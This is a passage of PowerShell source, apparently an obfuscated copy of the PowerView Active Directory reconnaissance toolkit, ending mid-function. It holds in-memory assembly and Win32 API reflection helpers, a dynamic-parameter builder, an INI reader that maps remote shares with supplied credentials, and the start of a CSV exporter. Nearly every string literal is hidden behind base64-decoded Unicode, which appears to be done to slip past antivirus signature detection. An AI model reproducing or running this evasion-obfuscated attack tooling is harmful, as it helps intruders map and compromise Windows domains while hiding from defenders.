
function New-InMemoryModule {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $AppDomain = [Reflection.Assembly].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBBAHAAcABEAG8AbQBhAGkAbgA=')))).GetProperty($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgA=')))).GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()
    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }
    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4A'))))
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    return $ModuleBuilder
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $EntryPoint,
        [Switch]
        $SetLastError
    )
    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = $NativeCallingConvention }
    if ($Charset) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = $Charset }
    if ($SetLastError) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = $SetLastError }
    if ($EntryPoint) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))] = $EntryPoint }
    New-Object PSObject -Property $Properties
}
function Add-Win32Type
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $TypeHash = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
            }
            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))),
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $null)
                }
                $i++
            }
            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            $CallingConventionField = $DllImport.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            $CharsetField = $DllImport.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
            $EntryPointField = $DllImport.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA='))))
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))]) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))
            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }
        $ReturnTypes = @{}
        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()
            $ReturnTypes[$Key] = $Type
        }
        return $ReturnTypes
    }
}
function psenum {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    $EnumType = $Type -as [Type]
    $EnumBuilder = $Module.DefineEnum($FullName, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), $EnumType)
    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }
    foreach ($Key in $EnumElements.Keys)
    {
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }
    $EnumBuilder.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}
function struct
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,
        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $ExplicitLayout
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    [Reflection.TypeAttributes] $StructAttributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAaQBDAGwAYQBzAHMALAANAAoAIAAgACAAIAAgACAAIAAgAEMAbABhAHMAcwAsAA0ACgAgACAAIAAgACAAIAAgACAAUAB1AGIAbABpAGMALAANAAoAIAAgACAAIAAgACAAIAAgAFMAZQBhAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    $Fields = New-Object Hashtable[]($StructFields.Count)
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field][$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHMAaQB0AGkAbwBuAA==')))]
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }
    foreach ($Field in $Fields)
    {
        $FieldName = $Field[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGUAbABkAE4AYQBtAGUA')))]
        $FieldProp = $Field[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        $Offset = $FieldProp[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA')))]
        $Type = $FieldProp[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA=')))]
        $MarshalAs = $FieldProp[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHIAcwBoAGEAbABBAHMA')))]
        $NewField = $StructBuilder.DefineField($FieldName, $Type, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            $NewField.SetCustomAttribute($AttribBuilder)
        }
        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }
    $SizeMethod = $StructBuilder.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwBpAHoAZQA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    $ImplicitConverter = $StructBuilder.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG0AZQA='))),
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    $StructBuilder.CreateType()
}
Function New-DynamicParameter {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQAgAG0AdQBzAHQAIABiAGUAIABhACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFIAdQBuAHQAaQBtAGUARABlAGYAaQBuAGUAZABQAGEAcgBhAG0AZQB0AGUAcgBEAGkAYwB0AGkAbwBuAGEAcgB5ACAAbwBiAGoAZQBjAHQA')))
            }
            $true
        })]
        $Dictionary = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQA=')))) {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMAIABtAHUAcwB0ACAAYgBlACAAYQAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMARABpAGMAdABpAG8AbgBhAHIAeQAgAG8AYgBqAGUAYwB0AA==')))
            }
            $true
        })]
        $BoundParameters
    )
    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBFAHEAdQBhAGwAcwAkAA==')))) {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }
            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            $AttributeRegex = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAE0AYQBuAGQAYQB0AG8AcgB5AHwAUABvAHMAaQB0AGkAbwBuAHwAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQB8AEQAbwBuAHQAUwBoAG8AdwB8AEgAZQBsAHAATQBlAHMAcwBhAGcAZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQBCAHkAUAByAG8AcABlAHIAdAB5AE4AYQBtAGUAfABWAGEAbAB1AGUARgByAG8AbQBSAGUAbQBhAGkAbgBpAG4AZwBBAHIAZwB1AG0AZQBuAHQAcwApACQA')))
            $ValidationRegex = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEEAbABsAG8AdwBOAHUAbABsAHwAQQBsAGwAbwB3AEUAbQBwAHQAeQBTAHQAcgBpAG4AZwB8AEEAbABsAG8AdwBFAG0AcAB0AHkAQwBvAGwAbABlAGMAdABpAG8AbgB8AFYAYQBsAGkAZABhAHQAZQBDAG8AdQBuAHQAfABWAGEAbABpAGQAYQB0AGUATABlAG4AZwB0AGgAfABWAGEAbABpAGQAYQB0AGUAUABhAHQAdABlAHIAbgB8AFYAYQBsAGkAZABhAHQAZQBSAGEAbgBnAGUAfABWAGEAbABpAGQAYQB0AGUAUwBjAHIAaQBwAHQAfABWAGEAbABpAGQAYQB0AGUAUwBlAHQAfABWAGEAbABpAGQAYQB0AGUATgBvAHQATgB1AGwAbAB8AFYAYQBsAGkAZABhAHQAZQBOAG8AdABOAHUAbABsAE8AcgBFAG0AcAB0AHkAKQAkAA==')))
            $AliasRegex = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBBAGwAaQBhAHMAJAA=')))
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }
    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}
function Get-IniContent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $OutputObject
    )
    BEGIN {
        $MappedComputers = @{}
    }
    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }
            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                    $IniObject = New-Object PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAFsAKAAuACsAKQBcAF0A'))) 
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Section = $Section.Replace(' ', '')
                            $SectionObject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount = 0
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoADsALgAqACkAJAA='))) 
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) + $CommentCount
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuACsAPwApAFwAcwAqAD0AKAAuACoAKQA='))) 
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }
    END {
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}
function Export-PowerViewCSV {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',
        [Switch]
        $Append
    )
    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))])
        $Exists = [System.IO.File]::Exists($OutputPath)
        $Mutex = New-Object System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')))
        $Null = $Mutex.WaitOne()
